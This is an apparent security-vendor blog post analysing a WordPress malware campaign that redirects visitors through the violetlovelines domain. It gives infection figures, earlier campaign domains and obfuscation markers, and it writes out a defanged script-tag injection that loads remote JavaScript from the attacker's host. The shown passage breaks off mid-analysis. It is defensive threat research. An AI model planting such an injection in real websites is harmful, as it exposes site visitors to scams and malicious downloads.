---
title: Massive Campaign Uses Hacked WordPress Sites as Platform for Black Hat Ad Network
url: https://blog.sucuri.net/2023/01/massive-campaign-uses-hacked-wordpress-sites-as-platform-for-black-hat-ad-network.html
source: Sucuri Blog
date: 2023-01-25
fetch_date: 2025-10-04T04:43:09.644762
---

# Massive Campaign Uses Hacked WordPress Sites as Platform for Black Hat Ad Network

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)

[Login](https://dashboard.sucuri.net/login/)

[Login](https://dashboard.sucuri.net/login)

New Customer?

[Sign up now.](https://sucuri.net/website-security-platform/signup/)

* [Submit a ticket](https://support.sucuri.net/support/?new)
* [Knowledge base](https://docs.sucuri.net/)
* [Chat now](https://sucuri.net/live-chat/)

Search for:

Search

* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [Website Security](https://blog.sucuri.net/category/website-security)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

# Massive Campaign Uses Hacked WordPress Sites as Platform for Black Hat Ad Network

[![](https://secure.gravatar.com/avatar/292c42da0d9f929a9405e6ce269f101cc888f5c5cbcf8006e131c9bed042c80d?s=60&d=mm&r=g)](https://blog.sucuri.net/author/denis)

[Denis Sinegubko](https://blog.sucuri.net/author/denis)

* January 24, 2023

![Massive Campaign Uses Hacked WordPress Sites as Platform for Black Hat Ad Network](https://blog.sucuri.net/wp-content/uploads/2023/01/BlogPost_Feature-Image_1490x700_Massive-WordPress-Malware-Campaign-820x386.png)

Every so often attackers register a new domain to host their malware. In many cases, these new domains are associated with specific malware campaigns, often related to redirecting legitimate website traffic to third party sites of their choosing — including [tech support scams](https://blog.sucuri.net/2018/10/multiple-ways-to-inject-the-same-tech-support-scam-malware.html), [adult dating](https://blog.sucuri.net/2019/12/unmasking-black-hat-seo-for-dating-scams.html), phishing, or drive-by-downloads.

Since late December, our team has been tracking a new spike in WordPress website infections related to the following malicious domain: **track[.]violetlovelines[.]com**

PublicWWW results show over [5,600 websites impacted by this malware](https://publicwww.com/websites/%22violetlovelines.com%22/) at the time of writing, while [urlscan.io shows evidence](https://urlscan.io/search/#%22violetlovelines.com%22) of the campaign operating since December 26th, 2022.

What we see is just a new wave of the same WordPress infection campaign that we’ve been tracking for [5+ years](https://blog.sucuri.net/2017/09/old-themes-abandoned-scripts-pitfalls-cleaning-serialized-data.html). For example, the previous wave (seen early December, 2022) involved the “**way.specialblueitems[.]com**” domain — currently [reported on over 3,700 sites](https://publicwww.com/websites/%22specialblueitems.com%22/). And a few months earlier, the September wave with the “**weatherplllatform[.]com**” domain which is [still reported by PublicWWW on over 6,900 sites](https://publicwww.com/websites/%22weatherplllatform.com%22/).

In today’s post, together with my colleague [Ben Martin](https://blog.sucuri.net/author/benmartin), we are going to review how this latest wave for the **violetlovelines** domain behaves, how the campaign has evolved in recent months, and how to remove the malware from your website if you’ve fallen victim to this infection.

**Contents:**

* **[Types of injections](#injection-types)**
* **[Redirect chains and ad networks](#redirect-chains-and-ad-networks)**
* **[Sketchy marketing](#sketchy-marketing)**
* **[Fake browser updates](#fake-browser-updates)**
* **[Tech support scams](#tech-support-scams)**
* **[Malicious drive by downloads from Discord](#drive-by-downloads)**
* **[Google Safe Browsing](#google-safe-browsing)**
* [**Remediation and cleanup steps**](#remediation-clean-up)

## Types of injections

When inspecting infected websites, we currently find two common types of **violetlovelines[.]com** injections.

The first type is a simple script tag injection (subdomain and filename may vary):

```
<script type='text/javascript' src='hxxps://track.violetlovelines[.]com/src/jack.js?v=...’ async='true'></script>
```

And the second type is obfuscated JavaScript that leverages the **fromCharCode** function. It hasn’t changed much from wave to wave. The most recent **violetlovelines** wave can be distinguished by the tell-tale comments embedded into the scripts: /\***45799456858784723456764596**\*/ and /\***4568587847234**\*/.

### **Simple script injections**

The source of the simple tag injections is this malicious PHP code which can usually be found at the top of the main WordPress **index.php** file.

[![Malware at the top of index.php for violetlovelines](https://blog.sucuri.net/wp-content/uploads/2023/01/index_php.png)](https://blog.sucuri.net/wp-content/uploads/2023/01/index_php.png)

Malware at the top of index.php

This malware injection in **index.php** is typical to the recent waves of this campaign. Just in the last 60 days, we’ve removed it from **33,000+** files on infected websites.

The **chr** obfuscation remains the same, while the comments (e.g. /\***246567566345435**\*/) and encoded URLs change from wave to wave.

For the current **violetlovelines** variant, the deobfuscated code looks like this:

[![Deobfuscated malware in index.php for violetlovelines injection](https://blog.sucuri.net/wp-conten...